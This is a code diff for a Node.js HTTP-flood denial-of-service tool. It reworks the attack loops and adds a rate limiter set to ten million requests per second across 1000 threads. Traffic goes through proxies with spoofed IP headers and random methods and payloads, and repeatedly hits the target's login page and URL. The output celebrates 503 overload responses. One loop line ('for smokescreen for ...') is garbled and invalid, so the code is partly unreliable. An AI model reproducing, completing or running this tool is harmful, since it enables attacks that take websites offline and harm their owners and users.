@@ -11,6 +11,36 @@ const app = express();
 app.use(express.json());
 
 const stateFilePath = path.join(__dirname, 'attackState.json');
+const proxyFilePath = path.join(__dirname, "proxy.txt");
+const ualist = path.join(__dirname, "ua.txt");
+
+// Configuration
+const maxRequests = Number.MAX_SAFE_INTEGER;
+const requestsPerSecond = 10000000;
+const numThreads = 1000;
+
+// Rate limiter state
+let requestCount = 0;
+let tokens = requestsPerSecond;
+let lastRefill = Date.now();
+
+// Rate limiter function
+const refillTokens = () => {
+    const now = Date.now();
+    const elapsedSeconds = (now - lastRefill) / 1000;
+    tokens = Math.min(requestsPerSecond, tokens + elapsedSeconds * requestsPerSecond);
+    lastRefill = now;
+};
+
+const canSendRequest = () => {
+    refillTokens();
+    if (requestCount >= maxRequests || tokens < 1) {
+        return false;
+    }
+    tokens--;
+    requestCount++;
+    return true;
+};
 
 const ensureStateFileExists = () => {
     if (!fs.existsSync(stateFilePath)) {
@@ -94,12 +124,6 @@ const acceptHeaders = [
     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
 ];
 
-const proxyFilePath = path.join(__dirname, "proxy.txt");
-const ualist = path.join(__dirname, "ua.txt");
-const maxRequests = Number.MAX_SAFE_INTEGER;
-const requestsPerSecond = 10000000;
-const numThreads = 1000;
-
 const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
 const sanitizeUA = (userAgent) => userAgent.replace(/[^\x20-\x7E]/g, "");
 
@@ -120,7 +144,6 @@ const loadProxies = () => {
     }
 };
 
-// Random payload generator
 const generateRandomPayload = () => {
     const payloadTypes = ['json', 'form', 'text'];
     const type = getRandomElement(payloadTypes);
@@ -155,53 +178,60 @@ const generateRandomPayload = () => {
     }
 };
 
-// Available HTTP methods for random attack
 const httpMethods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'];
 
-// Random attack function
-const randomAttack = (url, agent, continueAttack) => {
-    if (!continueAttack || !url) return;
+const createHeaders = (url) => ({
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": sanitizeUA(getRandomElement(userAgents())),
+    "Accept": getRandomElement(acceptHeaders),
+    "Accept-Language": getRandomElement(langHeaders),
+    "Cache-Control": getRandomElement(cipherSuites),
+    "Referer": getRandomElement(referrers),
+    "Connection": "keep-alive",
+    "DNT": "1",
+    "Upgrade-Insecure-Requests": "1",
+    "TE": "Trailers",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Pragma": getRandomElement(cipherSuites),
+    "X-Forwarded-For": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
+    "Via": `1.1 ${Math.random().toString(36).substring(7)}`,
+    "X-Real-IP": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
+    "Sec-Ch-UA": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
+    "Host": url.replace(/https?:\/\//, "").split("/")[0],
+    "sec-fetch-site": "same-origin",
+    "Sec-Fetch-User": "?1",
+    "Origin": url.split("/").slice(0, 3).join("/"),
+    "X-XSS-Protection": "1; mode=block",
+    "X-Frame-Options": "DENY",
+    "X-Content-Type-Options": "nosniff",
+    "If-None-Match": '"W/"5c-1f7b"',
+    "X-Requested-With": "XMLHttpRequest",
+    "Content-Security-Policy": "default-src 'self'; script-src 'unsafe-inline' 'unsafe-eval'; object-src 'none';",
+    "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
+    "Feature-Policy": "geolocation 'none'; microphone 'none'; camera 'none';",
+    "Accept-Charset": "utf-8",
+    "Expires": "0",
+    "X-Content-Security-Policy": "default-src 'self';",
+    "X-Download-Options": "noopen",
+    "X-DNS-Prefetch-Control": "off",
+    "X-Permitted-Cross-Domain-Policies": "none",
+    "X-Powered-By": "PHP/7.4.3",
+});
+
+const randomAttack = async (url, agent, continueAttack) => {
+    if (!continueAttack || !url || !canSendRequest()) {
+        if (requestCount >= maxRequests) {
+            console.log(rainbow("Maximum request limit reached. Stopping attack."));
+            continueAttack = false;
+        }
+        setTimeout(() => randomAttack(url, agent, continueAttack), 100);
+        return;
+    }
 
     const method = getRandomElement(httpMethods);
     const { data: payload, contentType } = generateRandomPayload();
-
-    const headersForRequest = {
-        "Content-Type": contentType,
-        "User-Agent": sanitizeUA(getRandomElement(userAgents())),
-        "Accept": getRandomElement(acceptHeaders),
-        "Accept-Language": getRandomElement(langHeaders),
-        "Cache-Control": getRandomElement(cipherSuites),
-        "Referer": getRandomElement(referrers),
-        "Connection": "keep-alive",
-        "DNT": "1",
-        "Upgrade-Insecure-Requests": "1",
-        "TE": "Trailers",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Pragma": getRandomElement(cipherSuites),
-        "X-Forwarded-For": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
-        "Via": `1.1 ${Math.random().toString(36).substring(7)}`,
-        "X-Real-IP": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
-        "Sec-Ch-UA": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
-        "Host": url.replace(/https?:\/\//, "").split("/")[0],
-        "sec-fetch-site": "same-origin",
-        "Sec-Fetch-User": "?1",
-        "Origin": url.split("/").slice(0, 3).join("/"),
-        "X-XSS-Protection": "1; mode=block",
-        "X-Frame-Options": "DENY",
-        "X-Content-Type-Options": "nosniff",
-        "If-None-Match": '"W/"5c-1f7b"',
-        "X-Requested-With": "XMLHttpRequest",
-        "Content-Security-Policy": "default-src 'self'; script-src 'unsafe-inline' 'unsafe-eval'; object-src 'none';",
-        "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
-        "Feature-Policy": "geolocation 'none'; microphone 'none'; camera 'none';",
-        "Accept-Charset": "utf-8",
-        "Expires": "0",
-        "X-Content-Security-Policy": "default-src 'self';",
-        "X-Download-Options": "noopen",
-        "X-DNS-Prefetch-Control": "off",
-        "X-Permitted-Cross-Domain-Policies": "none",
-        "X-Powered-By": "PHP/7.4.3",
-    };
+    const headersForRequest = createHeaders(url);
+    headersForRequest["Content-Type"] = contentType;
 
     const config = {
         httpAgent: agent,
@@ -212,121 +242,56 @@ const randomAttack = (url, agent, continueAttack) => {
         data: method !== 'GET' && method !== 'HEAD' ? payload : undefined
     };
 
-    axios(config)
-        .then(() => {
-            setTimeout(() => randomAttack(url, agent, continueAttack), 0);
-        })
-        .catch((err) => {
-            if (
-                err.code === "ECONNRESET" ||
-                err.code === "ECONNREFUSED" ||
-                err.code === "EHOSTUNREACH" ||
-                err.code === "ETIMEDOUT" ||
-                err.code === "EAI_AGAIN" ||
-                err.message === "Socket is closed"
-            ) {
-                // console.log(rainbow("Unable to Attack Target Server Refused!"));
-            } else if (err.response?.status === 404) {
-                // console.log(rainbow("Target returned 404 (Not Found). Stopping further attacks."));
-            } else if (err.response?.status === 503) {
-                console.log(rainbow("Target under heavy load (503) - Game Over!"));
-            } else if (err.response?.status === 502) {
-                console.log(rainbow("Bad Gateway (502)."));
-            } else if (err.response?.status === 403) {
-                // console.log(rainbow("Forbidden (403)."));
-            } else if (err.response?.status) {
-                // console.log(rainbow(`DDOS Status: (${err.response?.status})`));
-            } else {
-                // console.log(rainbow(err.message || "ATTACK FAILED!"));
-            }
-            setTimeout(() => randomAttack(url, agent, continueAttack), 0);
-        });
+    try {
+        await axios(config);
+        setTimeout(() => randomAttack(url, agent, continueAttack), 0);
+    } catch (err) {
+        handleError(err);
+        setTimeout(() => randomAttack(url, agent, continueAttack), 0);
+    }
 };
 
-const performAttack = (url, agent, continueAttack) => {
-    if (!continueAttack || !url) return;
+const performAttack = async (url, agent, continueAttack) => {
+    if (!continueAttack || !url || !canSendRequest()) {
+        if (requestCount >= maxRequests) {
+            console.log(rainbow("Maximum request limit reached. Stopping attack."));
+            continueAttack = false;
+        }
+        setTimeout(() => performAttack(url, agent, continueAttack), 100);
+        return;
+    }
 
-    const headersForRequest = {
-        "Content-Type": "application/x-www-form-urlencoded",
-        "User-Agent": sanitizeUA(getRandomElement(userAgents())),
-        "Accept": getRandomElement(acceptHeaders),
-        "Accept-Language": getRandomElement(langHeaders),
-        "Cache-Control": getRandomElement(cipherSuites),
-        "Referer": getRandomElement(referrers),
-        "Connection": "keep-alive",
-        "DNT": "1",
-        "Upgrade-Insecure-Requests": "1",
-        "TE": "Trailers",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Pragma": getRandomElement(cipherSuites),
-        "X-Forwarded-For": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
-        "Via": `1.1 ${Math.random().toString(36).substring(7)}`,
-        "X-Real-IP": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
-        "Sec-Ch-UA": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
-        "Host": url.replace(/https?:\/\//, "").split("/")[0],
-        "sec-fetch-site": "same-origin",
-        "Sec-Fetch-User": "?1",
-        "Origin": url.split("/").slice(0, 3).join("/"),
-        "X-XSS-Protection": "1; mode=block",
-        "X-Frame-Options": "DENY",
-        "X-Content-Type-Options": "nosniff",
-        "If-None-Match": '"W/"5c-1f7b"',
-        "X-Requested-With": "XMLHttpRequest",
-        "Content-Security-Policy": "default-src 'self'; script-src 'unsafe-inline' 'unsafe-eval'; object-src 'none';",
-        "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
-        "Feature-Policy": "geolocation 'none'; microphone 'none'; camera 'none';",
-        "Accept-Charset": "utf-8",
-        "Expires": "0",
-        "X-Content-Security-Policy": "default-src 'self';",
-        "X-Download-Options": "noopen",
-        "X-DNS-Prefetch-Control": "off",
-        "X-Permitted-Cross-Domain-Policies": "none",
-        "X-Powered-By": "PHP/7.4.3",
-    };
+    const headersForRequest = createHeaders(url);
 
-    axios.post(url.match(/^(https?:\/\/[^\/]+)/)[0] + "/login", {
-        state: fakeState()
-    })
-        .then(() => {
-            setTimeout(() => performAttack(url, agent, continueAttack), 0);
-        })
-        .catch((err) => {
-            setTimeout(() => performAttack(url, agent, continueAttack), 0);
-        });
+    try {
+        await Promise.all([
+            axios.post(url.match(/^(https?:\/\/[^\/]+)/)[0] + "/login", { state: fakeState() }, { httpAgent: agent, headers: headersForRequest, timeout: 0 }),
+            axios.get(url, { httpAgent: agent, headers: headersForRequest, timeout: 0 })
+        ]);
+        setTimeout(() => performAttack(url, agent, continueAttack), 0);
+    } catch (err) {
+        handleError(err);
+        setTimeout(() => performAttack(url, agent, continueAttack), 0);
+    }
+};
 
-    axios.get(url, {
-        httpAgent: agent,
-        headers: headersForRequest,
-        timeout: 0,
-    })
-        .then(() => {
-            setTimeout(() => performAttack(url, agent, continueAttack), 0);
-        })
-        .catch((err) => {
-            if (
-                err.code === "ECONNRESET" ||
-                err.code === "ECONNREFUSED" ||
-                err.code === "EHOSTUNREACH" ||
-                err.code === "ETIMEDOUT" ||
-                err.code === "EAI_AGAIN" ||
-                err.message === "Socket is closed"
-            ) {
-                // console.log(rainbow("Unable to Attack Target Server Refused!"));
-            } else if (err.response?.status === 404) {
-                // console.log(rainbow("Target returned 404 (Not Found). Stopping further attacks."));
-            } else if (err.response?.status === 503) {
-                console.log(rainbow("Target under heavy load (503) - Game Over!"));
-            } else if (err.response?.status === 502) {
-                console.log(rainbow("Bad Gateway (502)."));
-            } else if (err.response?.status === 403) {
-                // console.log(rainbow("Forbidden (403)."));
-            } else if (err.response?.status) {
-                // console.log(rainbow(`DDOS Status: (${err.response?.status})`));
-            } else {
-                // console.log(rainbow(err.message || "ATTACK FAILED!"));
-            }
-            setTimeout(() => performAttack(url, agent, continueAttack), 0);
-        });
+const handleError = (err) => {
+    if (err.code === "ECONNRESET" || err.code === "ECONNREFUSED" || err.code === "EHOSTUNREACH" || 
+        err.code === "ETIMEDOUT" || err.code === "EAI_AGAIN" || err.message === "Socket is closed") {
+        // console.log(rainbow("Unable to Attack Target Server Refused!"));
+    } else if (err.response?.status === 404) {
+        // console.log(rainbow("Target returned 404 (Not Found). Stopping further attacks."));
+    } else if (err.response?.status === 503) {
+        console.log(rainbow("Target under heavy load (503) - Game Over!"));
+    } else if (err.response?.status === 502) {
+        console.log(rainbow("Bad Gateway (502)."));
+    } else if (err.response?.status === 403) {
+        // console.log(rainbow("Forbidden (403)."));
+    } else if (err.response?.status) {
+        // console.log(rainbow(`DDOS Status: (${err.response?.status})`));
+    } else {
+        // console.log(rainbow(err.message || "ATTACK FAILED!"));
+    }
 };
 
 const updateState = () => {
@@ -352,6 +317,11 @@ const startAttack = (url, durationHours) => {
             return;
         }
 
+        // Reset rate limiter
+        requestCount = 0;
+        tokens = requestsPerSecond;
+        lastRefill = Date.now();
+
         continueAttack = true;
         targetUrl = validUrl;
         startTime = Date.now();
@@ -359,9 +329,10 @@ const startAttack = (url, durationHours) => {
 
         const attackTimeout = setTimeout(() => {
             continueAttack = false;
+            console.log(rainbow("Attack duration completed. Stopping attack."));
         }, duration);
 
-        for (let i = 0; i < numThreads; i++) {
+        for smokescreen for (let i = 0; i < Math.min(numThreads, proxies.length); i++) {
             if (!continueAttack) break;
 
             const randomProxy = getRandomElement(proxies);
